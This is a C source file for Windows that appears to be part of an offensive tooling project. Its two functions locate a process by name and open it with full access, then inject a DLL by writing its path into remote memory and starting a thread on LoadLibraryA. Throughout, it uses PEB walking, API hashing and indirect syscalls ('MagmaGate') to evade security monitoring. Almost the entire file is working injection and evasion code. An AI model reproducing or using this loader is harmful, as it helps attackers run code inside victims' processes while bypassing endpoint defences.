#include "box.h"

#pragma warning (disable:4996)

BOOL GetRemoteProcessHandle
(
	IN LPCWSTR szProcName,
	OUT DWORD* PID,
	OUT HANDLE* hProcess
)

{

	ULONG							uReturnLen1 = NULL, uReturnLen2 = NULL;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = NULL;
	HMODULE							ntdll = NULL;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[2] = { 0 };

	ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtQuerySystemInformation",
		"NtOpenProcess"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
	((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
		(SystemProcessInformation, NULL, 0, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL)
	{
		WARN("HeapAlloc Failed! Reason: %lu", GetLastError());
		return FALSE;
	}

	OKAY("Successfully Allocated Heap into the System Process Information!");

	pValueToFree = SystemProcInfo;

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtQuerySystemInformation
	STATUS = ((NTSTATUS(*)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG))SyscallInvoker)
		(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != STATUS_SUCCESS)
	{
		WARN("NtQuerySystemInformation Failed! Reason: 0x%0.8x", STATUS);
		return FALSE;
	}


	while (TRUE)
	{
		if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0)
		{

			ULONG_PTR foundPid = (ULONG_PTR)SystemProcInfo->UniqueProcessId;
			*PID = (DWORD)foundPid;

			CLIENT_ID CID;
			CID.UniqueProcess = (HANDLE)foundPid;
			CID.UniqueThread = NULL;

			SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtOpenProcess
			STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))SyscallInvoker)
				(hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
			if (STATUS != STATUS_SUCCESS)
			{
				WARN("NtOpenProcess Failed! Reason: 0x%0.8x", STATUS);
				return FALSE;
			}
			break;

		}

		if (!SystemProcInfo->NextEntryOffset)
		{
			break;
		}


		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);

	}



	if (pValueToFree)
		HeapFree(GetProcessHeap(), 0, pValueToFree);

	// check numeric PID and handle
	if (*PID == 0 || *hProcess == NULL)
		return FALSE;

	return TRUE;
}

BOOL DllInject
(
	IN LPCSTR DllPath,
	IN HANDLE hProcess,
	IN DWORD PID
)
{

	NTSTATUS		STATUS = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	SIZE_T       BytesWritten = 0;
	ULONG	   suspendedCount = 0;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	PVOID stackBase = NULL;
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
	SYSCALL_INFO info = { 0 };
	INSTRUCTIONS_INFO syscallInfos[5] = { 0 };
	CONTEXT ThreadCtx;
	RtlSecureZeroMemory(&ThreadCtx, sizeof(ThreadCtx));
	ThreadCtx.ContextFlags = CONTEXT_FULL;
	SIZE_T dllSize = strlen(DllPath) + 1;

	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	PVOID pLoadLibraryA = GetProcAddress(hKernel32, "LoadLibraryA");

	HMODULE ntdll = WalkPeb();
	if (!ntdll)
	{
		PRINT_ERROR("WalkPeb");
		return 1;
	}

	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);

	if (!GetEAT(ntdll, &pImgDir))
	{
		PRINT_ERROR("GetEAT");
		return 1;
	}

	const CHAR* Functions[] =
	{
		"NtAllocateVirtualMemory",
		"NtWriteVirtualMemory",
		"NtCreateThreadEx",
		"NtWaitForSingleObject",
		"NtClose"
	};

	size_t FuncSize = ARRAYSIZE(Functions);

	for (size_t i = 0; i < FuncSize; i++)
	{
		DWORD apiHash = GetBaseHash(
			Functions[i],
			ntdll,
			pImgDir
		);

		MagmaGate(pImgDir, ntdll, apiHash, &info);

		syscallInfos[i].SSN = info.SSN;
		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
	}

	INFO("[%s] Current Dll Path", DllPath);

	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtAllocateVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG))SyscallInvoker)
		(hProcess, &rBuffer, 0, &dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", dllSize);

	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtWriteVirtualMemory
	STATUS = ((NTSTATUS(*)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T))SyscallInvoker)
		(hProcess, rBuffer, DllPath, dllSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtCreateThreadEx
	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
		(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, pLoadLibraryA, rBuffer, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Created Thread!");

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtWaitForSingleObject
	STATUS = ((NTSTATUS(*)(HANDLE, BOOLEAN, PLARGE_INTEGER))SyscallInvoker)
		(hThread, FALSE, NULL);
	INFO("Execution Completed! Cleaning Up!");

CLEANUP:

	if (hThread) {
		SetConfig(syscallInfos[4].SSN, syscallInfos[4].SyscallInstruction); // NtClose
		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
			(hThread);
		INFO("[0x%p] handle on thread closed", hThread);
	}

	if (hProcess) {
		SetConfig(syscallInfos[4].SSN, syscallInfos[4].SyscallInstruction); // NtClose
		STATUS = ((NTSTATUS(*)(HANDLE))SyscallInvoker)
			(hProcess);
		INFO("[0x%p] handle on process closed", hProcess);
	}
}